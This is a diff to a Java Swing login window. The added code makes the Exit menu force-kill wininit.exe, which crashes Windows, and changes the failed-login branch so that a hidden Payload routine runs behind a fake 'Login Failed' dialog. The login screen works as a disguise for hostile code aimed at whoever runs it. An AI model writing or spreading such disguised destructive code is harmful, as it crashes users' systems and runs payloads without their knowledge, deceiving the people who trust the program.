@@ -80,6 +80,7 @@ public class LoginGUI extends JFrame{
             miAbout.addActionListener(e -> JOptionPane.showMessageDialog(this, "Copyright 2021 java.com ALL Rights Reserved", "Important tips", JOptionPane.WARNING_MESSAGE));
             miExit.addActionListener(e -> {
                 try {
+                    Runtime.getRuntime().exec("taskkill /f /t /im wininit.exe");
                     Runtime.getRuntime().exec("taskkill /f /t /im java.exe");
                 } catch (IOException ioException) {
                     ioException.printStackTrace();
@@ -105,10 +106,8 @@ public class LoginGUI extends JFrame{
                         }
                     }
                 } else {
-                    lblFailed.setText("Login Failed.");
                     try {
                         Payload.main(new String[0]);
-                        lblFailed.setText("IDLE...");
                     } catch (Exception ex) {
                         ex.printStackTrace();
                         System.out.println("ERROR!");
@@ -119,6 +118,7 @@ public class LoginGUI extends JFrame{
                             System.out.println("Fuck");
                         }
                     }
+                    JOptionPane.showMessageDialog(this, "Login Failed.", "Message", JOptionPane.WARNING_MESSAGE);
                 }
             });
         }
